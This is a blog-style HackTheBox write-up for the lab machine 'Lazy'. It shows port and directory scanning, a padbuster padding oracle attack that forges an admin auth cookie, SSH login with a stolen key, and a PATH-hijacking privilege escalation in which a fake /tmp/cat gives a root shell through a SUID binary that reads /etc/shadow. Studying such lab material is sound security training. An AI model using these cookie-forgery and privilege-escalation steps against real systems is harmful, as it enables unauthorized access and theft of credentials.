---
image: /assets/img/lazy/lazy.png
layout: post
title: Lazy
date: 2020-10-12 00:00:01 +5:30
categories: [Hackthebox, Medium]
tags: [path_highjacking, oracle_padding_attack, crypto] # add tag
---

## Walkthrough

### Enumration

```bash
argenestel@parrot  ~/Desktop/hackthebox/lazy  rustscan  10.10.10.18
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
--------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.10.18:22
Open 10.10.10.18:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.10.18

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 00:14 IST
Initiating Ping Scan at 00:14
Scanning 10.10.10.18 [2 ports]
Completed Ping Scan at 00:14, 0.49s elapsed (1 total hosts)
Initiating Connect Scan at 00:14
Scanning lazy.htb (10.10.10.18) [2 ports]
Discovered open port 22/tcp on 10.10.10.18
Discovered open port 80/tcp on 10.10.10.18
Completed Connect Scan at 00:14, 0.31s elapsed (2 total ports)
Nmap scan report for lazy.htb (10.10.10.18)
Host is up, received conn-refused (0.44s latency).
Scanned at 2020-10-13 00:14:18 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
argenestel@parrot  ~/Desktop/hackthebox/lazy  nmap -sC -sV -p22,80  10.10.10.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 00:14 IST
Nmap scan report for lazy.htb (10.10.10.18)
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
argenestel@parrot  ~/Desktop/hackthebox/lazy 
```

So two ports are open 22 and 80

#### Port 80

So we can see a site

Dirbusting it with php extenion
```bash  
argenestel@parrot  ~/Desktop/hackthebox/lazy  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.18/FUZZ.php

       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/       

      v1.0.2
________________________________________________

:: Method           : GET
:: URL              : http://10.10.10.18/FUZZ.php
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 291, Words: 21, Lines: 11]
.htpasswd               [Status: 403, Size: 291, Words: 21, Lines: 11]
footer                  [Status: 200, Size: 51, Words: 19, Lines: 8]
header                  [Status: 200, Size: 734, Words: 239, Lines: 23]
index                   [Status: 200, Size: 1117, Words: 303, Lines: 42]
login                   [Status: 200, Size: 1548, Words: 416, Lines: 59]
logout                  [Status: 302, Size: 734, Words: 239, Lines: 23]
register                [Status: 200, Size: 1592, Words: 406, Lines: 61]
:: Progress: [20469/20469] :: Job [1/1] :: 152 req/sec :: Duration: [0:02:14] :: Errors: 0 ::

```
register and login
on changing the auth cookie we landed on invalid.<br />
so we found out about oracle padding attack

using padbuster to get the auth cookie

```bash
✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1486

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1564    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (208/256) [Byte 8]
[+] Success: (16/256) [Byte 7]
[+] Success: (93/256) [Byte 6]
[+] Success: (44/256) [Byte 5]
[+] Success: (45/256) [Byte 4]
[+] Success: (155/256) [Byte 3]
[+] Success: (157/256) [Byte 2]
[+] Success: (85/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): cc178a41f44a163d
[+] Intermediate Bytes (HEX): a36463d6d0a0f231
[+] Plain Text: user=adm

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (193/256) [Byte 8]
```

```bash
✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  padbuster http://10.10.10.18/login.php 1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 8 --cookie auth=1hcGpO3BllzMF4pB9EoWPek8Ar%2FcCi19 --encoding 0 -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1486

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1564    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
^[[B[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------

```
![]()

so using this token we login as admin and grab sshkey of user.

### PrivEsc

```bash
✘ argenestel@parrot  ~/Desktop/hackthebox/lazy  ssh -i mysshkeywithnamemitsos mitsos@10.10.10.18
load pubkey "mysshkeywithnamemitsos": invalid format
The authenticity of host '10.10.10.18 (10.10.10.18)' can't be established.
ECDSA key fingerprint is SHA256:OJ5DTyZUGZXEpX4BKFNTApa88gR/+w5vcNathKIPcWE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.18' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

* Documentation:  https://help.ubuntu.com/

 System information as of Mon Oct 12 20:16:50 EEST 2020

 System load: 0.0               Memory usage: 4%   Processes:       192
 Usage of /:  7.6% of 18.58GB   Swap usage:   0%   Users logged in: 0

 Graph this data and manage this system at:
   https://landscape.canonical.com/

Last login: Thu Jan 18 10:29:40 2018
mitsos@LazyClown:~$
```

We have a suid backup file which cat out /etc/shadow though it contains hashes seems like cracking them is not at all easy.

when we try strings we get it is doing
```terminal
cat /etc/shadow
```

so i changed the path variable


```terminal

export PATH=/tmp:$PATH
# echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games


/bin/cat /tmp/cat

#!/bin/sh
/bin/sh


mitsos@LazyClown:~$ ./backup
# id
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)

```
